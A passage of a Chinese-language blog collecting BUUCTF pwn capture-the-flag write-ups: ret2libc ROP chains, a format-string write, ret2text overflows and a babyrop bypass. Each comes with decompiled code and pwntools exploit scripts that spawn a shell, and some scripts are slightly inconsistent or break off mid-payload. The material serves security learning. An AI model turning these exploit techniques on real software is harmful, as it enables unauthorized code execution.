+    payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token comment"># 填满整个栈空间 + 控制rdi的值 + 传入got表中puts函数的位置 + 调用plt表中的puts函数 + 返回主函数实现got表中puts函数位置的输出</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input your choice!"</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input your Plaintext to be encrypted"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Ciphertext\n"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    puts_real <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment">#计算偏移和寻找libc</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>puts_real<span class="token punctuation">)</span>
+    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_real<span class="token punctuation">)</span>
+    offset <span class="token operator">=</span> puts_real <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
+    <span class="token comment">#getshell</span>
+    ret <span class="token operator">=</span> <span class="token number">0x4006b9</span>
+    system_real <span class="token operator">=</span> offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+    bin_sh_addr <span class="token operator">=</span> offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
+    payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_real<span class="token punctuation">)</span> <span class="token comment">#利用ret对齐堆栈，防止无法运行系统函数</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your choice!\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your Plaintext to be encrypted\n'</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    
+main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517234608771-4139334.png" alt="image-20220517234608771" loading="lazy"></p>
+<h1 id="BUUCTF-第五空间2019-决赛-PWN5"><a href="#BUUCTF-第五空间2019-决赛-PWN5" class="headerlink" title="BUUCTF-[第五空间2019 决赛]PWN5"></a>BUUCTF-[第五空间2019 决赛]PWN5</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220518170232227-4139334.png" alt="image-20220518170232227" loading="lazy"></p>
+<h2 id="思路–格式化字符串"><a href="#思路–格式化字符串" class="headerlink" title="思路–格式化字符串"></a>思路–格式化字符串</h2><h3 id="运行程序-5"><a href="#运行程序-5" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519000336442-4139334.png" alt="image-20220519000336442" loading="lazy"></p>
+<p>运行文件之后，出现两处输入，name和passwd，并且name的输入有回显，则有可能是栈漏洞和格式化字符串</p>
+<h3 id="IDA静态分析-5"><a href="#IDA静态分析-5" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><pre class="language-C" data-language="C"><code class="language-C">int __cdecl main(int a1)
+&#123;
+  unsigned int v1; &#x2F;&#x2F; eax
+  int result; &#x2F;&#x2F; eax
+  int fd; &#x2F;&#x2F; [esp+0h] [ebp-84h]
+  char nptr[16]; &#x2F;&#x2F; [esp+4h] [ebp-80h] BYREF
+  char buf[100]; &#x2F;&#x2F; [esp+14h] [ebp-70h] BYREF
+  unsigned int v6; &#x2F;&#x2F; [esp+78h] [ebp-Ch]
+  int *v7; &#x2F;&#x2F; [esp+7Ch] [ebp-8h]
+
+  v7 &#x3D; &amp;a1;
+  v6 &#x3D; __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 &#x3D; time(0);
+  srand(v1);
+  fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;, 0);&#x2F;&#x2F;读取随机内存数值
+  read(fd, &amp;dword_804C044, 4u);&#x2F;&#x2F;写入0x80c044的内存空间
+  printf(&quot;your name:&quot;);
+  read(0, buf, 0x63u); 
+  printf(&quot;Hello,&quot;);
+  printf(buf);
+  printf(&quot;your passwd:&quot;);
+  read(0, nptr, 0xFu);
+  if ( atoi(nptr) &#x3D;&#x3D; dword_804C044 )&#x2F;&#x2F; 匹配0x80c044的内存空间与输入的密码
+  &#123;
+    puts(&quot;ok!!&quot;);
+    system(&quot;&#x2F;bin&#x2F;sh&quot;);
+  &#125;
+  else
+  &#123;
+    puts(&quot;fail&quot;);
+  &#125;
+  result &#x3D; 0;
+  if ( __readgsdword(0x14u) !&#x3D; v6 )
+    sub_80493D0();
+  return result;
+&#125;</code></pre>
+
+<p>这题的程序打开了栈保护（canary）不能溢出，但是题目保留了后门，需要<code>if ( atoi(nptr) == dword_804C044 )</code>条件成立才能进入，然而0x80c044的内存空间是随机数值，无法获得；不过题目保留了格式化字符串的方法，因此可以使用格式化字符串将0x80c044的内存空间的值改为我们需要的值，通过条件判断，进入后门函数。</p>
+<h2 id="通用步骤"><a href="#通用步骤" class="headerlink" title="通用步骤"></a>通用步骤</h2><h3 id="查看位移"><a href="#查看位移" class="headerlink" title="查看位移"></a>查看位移</h3><pre class="language-bash" data-language="bash"><code class="language-bash">aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code></pre>
+
+<p>通过输入一段字符+-%p来确定位移的位置，本题的位移是10</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519102846904-4139334.png" alt="image-20220519102846904" loading="lazy"></p>
+<h3 id="构造payload-3"><a href="#构造payload-3" class="headerlink" title="构造payload"></a>构造payload</h3><blockquote>
+<p>%x是吧数据以16进制输出 %n是把已经输出的字符数目输入传来参数的地址中，这就可以使我们修改数据</p>
+<p>%10$n则将偏移位置为10的字符数量(8)写入到%10$n所指的地址（%10 –&gt; 0x804c044）中</p>
+</blockquote>
+<pre class="language-python" data-language="python"><code class="language-python">target <span class="token operator">=</span> <span class="token string">'0x080c044'</span>
+payload <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">b'aaaa%10$n'</span>
+<span class="token comment"># playload 输入之后相当于 printf(target,"aaaa%10$n")</span></code></pre>
+
+<p>payload一共8个字节，小段续存储</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519103643322-4139334.png" alt="image-20220519103643322" loading="lazy"></p>
+<p>然后我们看一下目标地址存的值：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519103921976-4139334.png" alt="image-20220519103921976" loading="lazy"></p>
+<p>我们控制了0x080c044地址的值，就可以获得后门，最终payload是</p>
+<pre class="language-python" data-language="python"><code class="language-python">target <span class="token operator">=</span> <span class="token number">0x0804C044</span> 
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">b"aaaa%10$n"</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your name:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your passwd:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#内存的值是8，不是0x8</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519104303256-4139334.png" alt="image-20220519104303256" loading="lazy"></p>
+<h1 id="BUUCTF-ciscn-2019-n-8"><a href="#BUUCTF-ciscn-2019-n-8" class="headerlink" title="BUUCTF-ciscn_2019_n_8"></a>BUUCTF-ciscn_2019_n_8</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519104724585-4139334.png" alt="image-20220519104724585" loading="lazy"></p>
+<p>好家伙，保护全开！</p>
+<h2 id="运行程序-6"><a href="#运行程序-6" class="headerlink" title="运行程序"></a>运行程序</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519110916003-4139334.png" alt="image-20220519110916003" loading="lazy"></p>
+<p>写了canary保护，导致无法溢出</p>
+<h2 id="IDA静态分析-6"><a href="#IDA静态分析-6" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp-14h] [ebp-20h]</span>
+  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp-10h] [ebp-1Ch]</span>
+
+  var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  var<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> var<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//scanf 第一个参数是var的指针</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">17LL</span> <span class="token punctuation">)</span> <span class="token comment">//只要var[13]等于0x17就可以获得后门</span>
+      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span>
+        <span class="token string">"something wrong! val is %d"</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        var<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s, Welcome!\n"</span><span class="token punctuation">,</span> var<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try do something~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>这题很简单，通过scanf函数将<code>var[13]==0x17</code>就行，那么我们输入14个0x17就可以让<code>var[13]==0x17</code></p>
+<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">14</span> <span class="token comment">#数组从0开始，一共14位</span></code></pre>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519120737055-4139334.png" alt="image-20220519120737055" loading="lazy"></p>
+<h1 id="BUUCTF-jarvisoj-level2"><a href="#BUUCTF-jarvisoj-level2" class="headerlink" title="BUUCTF-jarvisoj_level2"></a>BUUCTF-jarvisoj_level2</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519123439492-4139334.png" alt="image-20220519123439492" loading="lazy"></p>
+<h2 id="运行程序-7"><a href="#运行程序-7" class="headerlink" title="运行程序"></a>运行程序</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519123533189-4139334.png" alt="image-20220519123533189" loading="lazy"></p>
+<p>应该是栈溢出漏洞</p>
+<h2 id="IDA静态分析-7"><a href="#IDA静态分析-7" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><pre class="language-C" data-language="C"><code class="language-C">ssize_t vulnerable_function()
+&#123;
+  char buf[136]; &#x2F;&#x2F; [esp+0h] [ebp-88h] BYREF
+
+  system(&quot;echo Input:&quot;);
+  return read(0, buf, 0x100u);
+&#125;</code></pre>
+
+<p>典型的栈溢出题目，buf长度是0x88 但是read接受0x100，上面也有system的函数可以调用，找一下是否有<code>/bin/sh</code>可以使用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519123734248-4139334.png" alt="image-20220519123734248" loading="lazy"></p>
+<p>条件已经具备，可以写payload</p>
+<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><pre class="language-python" data-language="python"><code class="language-python">main_addr <span class="token operator">=</span> <span class="token number">0x804845c</span>
+bin_sh <span class="token operator">=</span> <span class="token number">0x804a024</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token string">b"d"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token comment">#32位程序ebp只有4字节</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519124046196-4139334.png" alt="image-20220519124046196" loading="lazy"></p>
+<h1 id="BUUCTF-jarvisoj-level2-x64"><a href="#BUUCTF-jarvisoj-level2-x64" class="headerlink" title="BUUCTF-jarvisoj_level2_x64"></a>BUUCTF-jarvisoj_level2_x64</h1><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220521222818130-4139334.png" alt="image-20220521222818130" loading="lazy"></p>
+<h2 id="IDA静态分析-8"><a href="#IDA静态分析-8" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>
+
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>这题跟上一题是一样的思路，ret2text。题目已经准备好bin/sh字符串和system的函数，而且<code>vulnerable_function</code>明显有栈溢出的漏洞，不过这题与上一题不一样的是架构，这题是64位架构，传参方式不一样，因此payload有所不同</p>
+<h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><pre class="language-python" data-language="python"><code class="language-python">bin_sh  <span class="token operator">=</span> <span class="token number">0x600a90</span>
+rdi_ret <span class="token operator">=</span> <span class="token number">0x4006b3</span>
+sys_addr <span class="token operator">=</span> <span class="token number">0x400603</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0x4004a1</span>
+playload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x80</span>  <span class="token comment">#栈溢出</span>
+playload <span class="token operator">+=</span> <span class="token string">b'd'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token comment">#覆盖rbp值</span>
+playload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span></code></pre>
+
+
+
+<h1 id="BUUCTF-babyrop"><a href="#BUUCTF-babyrop" class="headerlink" title="BUUCTF-babyrop"></a>BUUCTF-babyrop</h1><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519234920259-4139334.png" alt="image-20220519234920259" loading="lazy"></p>
+<h2 id="运行程序-8"><a href="#运行程序-8" class="headerlink" title="运行程序"></a>运行程序</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519235000588-4139334.png" alt="image-20220519235000588" loading="lazy"></p>
+<h2 id="IDA静态分析-9"><a href="#IDA静态分析-9" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><pre class="language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;main
+int __cdecl main()
+&#123;
+  int buf; &#x2F;&#x2F; [esp+4h] [ebp-14h] BYREF
+  char v2; &#x2F;&#x2F; [esp+Bh] [ebp-Dh]
+  int fd; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]
+
+  sub_80486BB();
+  fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;, 0);
+  if ( fd &gt; 0 )
+    read(fd, &amp;buf, 4u); &#x2F;&#x2F;读取随机数据
+  v2 &#x3D; sub_804871F(buf);
+  sub_80487D0(v2);
+  return 0;
+&#125;
+&#x2F;&#x2F;sub_804871F
+int __cdecl sub_804871F(int a1)
+&#123;
+  size_t v1; &#x2F;&#x2F; eax
+  char s[32]; &#x2F;&#x2F; [esp+Ch] [ebp-4Ch] BYREF
+  char buf[32]; &#x2F;&#x2F; [esp+2Ch] [ebp-2Ch] BYREF
+  ssize_t v5; &#x2F;&#x2F; [esp+4Ch] [ebp-Ch]
+
+  memset(s, 0, sizeof(s));
+  memset(buf, 0, sizeof(buf));
+  sprintf(s, &quot;%ld&quot;, a1);
+  v5 &#x3D; read(0, buf, 0x20u);
+  buf[v5 - 1] &#x3D; 0;
+  v1 &#x3D; strlen(buf);
+  if ( strncmp(buf, s, v1) ) &#x2F;&#x2F;如果字符串不相同，则会直接退出程序，而s是main函数中的buf（随机数），所以要想办法直接绕过这个比较，所以v1必须等于0。
+    exit(0);
+  write(1, &quot;Correct\n&quot;, 8u);
+  return (unsigned __int8)buf[7];
+&#125;
+&#x2F;&#x2F;sub_80487D0
+ssize_t __cdecl sub_80487D0(char a1)
+&#123;
+  char buf[231]; &#x2F;&#x2F; [esp+11h] [ebp-E7h] BYREF  
+
+  if ( a1 &#x3D;&#x3D; 127 )
+    return read(0, buf, 0xC8u);
+  else
+    return read(0, buf, a1); 
+    &#x2F;&#x2F;buf是个7位数的数组，但是函数中有read（0，buf，0x20u），而经过计算，v5相当于buf的第8位，所以v5是可以被我们指定的。a1 就是上文中的 v5，buf的地址为[ebp-E7],如果v5为127，则会执行第一条代码，C8&lt;E7,不能覆盖返回地址，v5需要尽可能的大，才能覆盖到返回地址。
+&#125;</code></pre>
+
+<blockquote>
+<p>v1 = strlen（buf），strlen这个函数有个缺陷：遇到\x00直接截断。所以我们要输入第一位数为\x00</p>
+</blockquote>
+<p>因此绕过第一个函数实现栈溢出的payload是</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'\x00'</span><span class="token operator">+</span>     <span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">'\xff'</span> <span class="token comment">#v5</span>
+         <span class="token comment">#绕过strncmp  填充至v5  因为返回的是buf[7] </span></code></pre>
+
+<p>然后就是ret2libc的套路：</p>
+<h2 id="ret2libc–套路"><a href="#ret2libc–套路" class="headerlink" title="ret2libc–套路"></a>ret2libc–套路</h2><h3 id="查看got表"><a href="#查看got表" class="headerlink" title="查看got表"></a>查看got表</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220520000532522-4139334.png" alt="image-20220520000532522" loading="lazy"></p>
+<p>可以利用write函数，返回read的got表地址，构造payload返回read函数的got表地址</p>
+<pre class="language-python" data-language="python"><code class="language-python">write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+read_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+main_addr<span class="token operator">=</span><span class="token number">0x8048825</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0xe7</span> <span class="token operator">+</span> <span class="token string">b"d"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_add<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+<span class="token comment">#                                 ret1           ret2</span>
+<span class="token comment">#这里有个套娃：write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数，</span>
+payload <span class="token operator">+=</span> p<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+ <span class="token comment">#write   par1     par2         par3</span>
+read_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#得到了write在内存中的位置 所以我们可以用题目提供的函数共享库算出system在内存中的位置</span></code></pre>
+
+<h3 id="利用libsearch计算偏移量"><a href="#利用libsearch计算偏移量" class="headerlink" title="利用libsearch计算偏移量"></a>利用libsearch计算偏移量</h3><pre class="language-python" data-language="python"><code class="language-python">read_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+base<span class="token operator">=</span>read_addr<span class="token operator">-</span>read_libc</code></pre>
+
+<h3 id="利用偏移量获取后门"><a href="#利用偏移量获取后门" class="headerlink" title="利用偏移量获取后门"></a>利用偏移量获取后门</h3><pre class="language-python" data-language="python"><code class="language-python">system_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+binsh_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+system_addr<span class="token operator">=</span>system_libc<span class="token operator">+</span>base
+binsh_addr<span class="token operator">=</span>binsh_libc<span class="token operator">+</span>base</code></pre>
+
+<p>因此最终payload可以组合出来</p>
+<h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h2><pre class="language-python" data-language="python"><code class="language-python">write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+read_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+read_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+system_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+binsh_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+
+main_addr<span class="token operator">=</span><span class="token number">0x8048825</span>
+
+payload<span class="token operator">=</span><span class="token string">'\x00'</span><span class="token operator">+</span>     <span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">'\xff'</span> <span class="token comment">#v5</span>
+
